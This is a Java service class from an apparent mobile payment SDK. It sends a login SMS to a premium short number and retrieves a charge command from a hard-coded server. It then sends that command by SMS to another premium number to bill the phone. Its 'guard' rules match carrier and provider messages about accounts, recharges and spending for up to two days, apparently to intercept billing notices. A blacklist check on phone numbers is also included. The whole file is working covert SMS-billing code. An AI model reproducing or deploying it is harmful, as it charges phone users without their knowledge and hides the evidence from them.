package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Error;
import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Repeat;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.handler.MobileInfoHandler;
import com.jxt.pay.helper.BlackMobileHelper;
import com.jxt.pay.pojo.MobileInfo;

/**
 * 第一步是手机发送一个登录指令
BUB@T|@W  NAA8uk87@hWg55tc80@66388999@2888468985@8@09*************@40955@*************到10658422
这2段13位的*符号是要随机生成13位数字构成。2段都是一样的数值。例如生成登录指令如下：
BUB@T|@W  NAA8uk87@hWg21tc44@76888329@8649608985@8@090913570982183@40955@0913570982183发送到10658422  随机13位数：0913570982183

第二步是wap登录取动态的扣费指令；
http://118.26.135.91:8080/cp/ob?randomCode=0913570982183&cpCodeInfoId=138&imei=&cpParam=SDKC000000000&cpID=33&format=xml  这条URL里面要同时添加随机13位值randomCode，数值和登录指令的随机13位数字一致。randomCode=0913570982183
即可得到下发内容为：<?xml version="1.0" encoding="UTF-8"?><info><linkid>ZrM6w5RBEbDhRDsejJU3UlgrmIV9EIbz<nkid><infoCode>0</infoCode><smsInfo>::pHRp[z:R2:]V[::3pRH^[:2fL:SH|To)>$::::9:eP::3<XHM::5:/Vz3]?:\6:::X:zY\W)uV!Mz11sT:Jc:r:2=::V[[>2Bg+~fYV2Ox.+|njf;mV~Do?}^NWETQ,HU^~d[</smsInfo><mobile>13570982183</mobile></info>

其中smsInfo>的值就是动态扣费指令。
取扣费指令：::pHRp[z:R2:]V[::3pRH^[:2fL:SH|To)>$::::9:eP::3<XHM::5:/Vz3]?:\6:::X:zY\W)uV!Mz11sT:Jc:r:2=::V[[>2Bg+~fYV2Ox.+|njf;mV~Do?}^NWETQ,HU^~d[发送到1065889923 
完成扣费。
 * @author leoliu
 *
 */
public class XmwtDynamicService implements IDynamicService{
	private static Logger logger = Logger.getLogger(XmwtDynamicService.class);
	
	private static final String TYPE = "xmwt";
	private static final String THENO_1 = "1";
	private static final String THENO_2 = "2";
//											  BUB@T|@W  NAA8uk87@hWg55tc80@66388999@2888468985@8@09*************@40955@*************	
	private static final String MSGCONTENT = "BUB@T|@W  NAA8uk87@hWg55tc80@66388999@2888468985@8@09{d}@40955@{d}";
	private static final String URLPARAM = "randomCode={randomCode}&cpCodeInfoId={cpCodeInfoId}&imei={imei}&cpParam=SDKC000000000&cpID=33&format=xml";
	private static final int LENGTH = 13;
	private static final String SMSDEST0 = "10658422";
	private static final String SMSDEST1 = "1065889923";
	private static final String DEFAULTCPCODEINFOID = "138";
	
	
	private static final Guard guard1 = new Guard("10658", "无法|稍后", 2880, "-1", 0);
	private static final Guard guard2 = new Guard("10658","处理|等候",2880,"0",0);
	private static final Guard guard6 = new Guard("10658","鹰潭麻将_OANS",2880,"1",0);
	private static final Guard guard3 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard4 = new Guard("10658","",960,null,1);
	private static final Guard guard5 = new Guard("10086","",960,null,1);
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	private int timeOut = 60;
	
	@Override
	public String getType() {
		return TYPE;
	}

	@Override
	public String dynamic(Map<String, String> map) {
		String theNo = map.get("theNo");
		
		if(THENO_1.equals(theNo)){
			return firstDynamic(map);
		}else if(THENO_2.equals(theNo)){
			return secondDynamic(map);
		}
		
		return null;
	}

	private String firstDynamic(Map<String,String> map){
		
		String random = getRandom(LENGTH);
		
		Sms sms = new Sms();
		sms.setSmsDest(SMSDEST0);
		sms.setSmsContent(MSGCONTENT.replace("{d}", random));
		sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
		
		StringBuffer smsBuffer = XstreamHelper.toXml(sms);
		
		Sets sets = new Sets();
		sets.setKey("randomCode");
		sets.setValue(random);
		
		StringBuffer setsBuffer = XstreamHelper.toXml(sets);
		
		setsBuffer.append(smsBuffer);
		
		return setsBuffer.toString();
	}
	//记录重复请求
	private Map<String, Long> tryMap = new HashMap<String, Long>();
			
	private String secondDynamic(Map<String,String> map){
		
		String xml = null;
		String url = map.get("url");
		
		String randomCode = map.get("randomCode");
		
		if(url != null && url.length() > 0){
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(randomCode);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(randomCode,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(randomCode);
					return DynamicUtils.parseError("599");
				}
			}
			
			String param = URLPARAM.replace("{randomCode}", map.get("randomCode"));
			param = param.replace("{imei}", map.get("imei"));
			
			String cpCodeInfoId = map.get("cpCodeInfoId");
			if(cpCodeInfoId == null || cpCodeInfoId.length() == 0){
				cpCodeInfoId = DEFAULTCPCODEINFOID;
			}
			param = param.replace("{cpCodeInfoId}", cpCodeInfoId);
			
			String responseXml = GetData.getData(url+"?"+param);
			
			if(responseXml != null && responseXml.length() > 0){
				xml = parseSecond(map,responseXml);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}else{
			tryMap.remove(randomCode);
		}
		
		return xml;
	}
	
	private String parseSecond(Map<String,String> map,String responseXml){
		
		String smsContent = SingleXmlUtil.getNodeValue(responseXml, "smsInfo");
		
		if(smsContent == null || smsContent.length() == 0){
			return DynamicUtils.parseWait(map);
		}else{
			tryMap.remove(map.get("randomCode"));
			
			String mobile = SingleXmlUtil.getNodeValue(responseXml, "mobile");
			
			boolean isBlack = false;
			
			try{
				
				if(blackMobileHelper.isBlack(mobile)){
					isBlack = true;
				}
				String mobileId = map.get("mobileId");
				
				if(mobileId != null && mobileId.length() > 0){
					MobileInfo mobileInfo = new MobileInfo();
					mobileInfo.setId(Long.parseLong(mobileId));
					mobileInfo.setMobile(mobile);
					mobileInfo.setIsBlack(isBlack);
					mobileInfoHandler.updateMobile1(mobileInfo);
				}
				
			}catch(Exception e){
				e.printStackTrace();
			}
			
			if(isBlack){
				
				return DynamicUtils.parseError("503");//黑名单
			}else{
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(smsContent);
				sms.setSmsDest(SMSDEST1);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
							
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
						
				guardList.add(guard6);
				guardList.add(guard3);
				guardList.add(guard4);
				guardList.add(guard5);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
			}
		}
	}
	
	private static final String[] arr = new String[]{"0","1","2","3","4","5","6","7","8","9"};

	private static String getRandom(int length){
		String random = "";
		
		for(int i = 0 ; i < length ; i ++){
			random += arr[new Random().nextInt(arr.length)];
		}
		
		return random;
	}
	
	private MobileInfoHandler mobileInfoHandler;
	
	private BlackMobileHelper blackMobileHelper;
	
	public void setMobileInfoHandler(MobileInfoHandler mobileInfoHandler){
		this.mobileInfoHandler = mobileInfoHandler;
	}

	public void setBlackMobileHelper(BlackMobileHelper blackMobileHelper) {
		this.blackMobileHelper = blackMobileHelper;
	}

	public void setTimeOut(int timeOut) {
		this.timeOut = timeOut;
	}
	
	
}
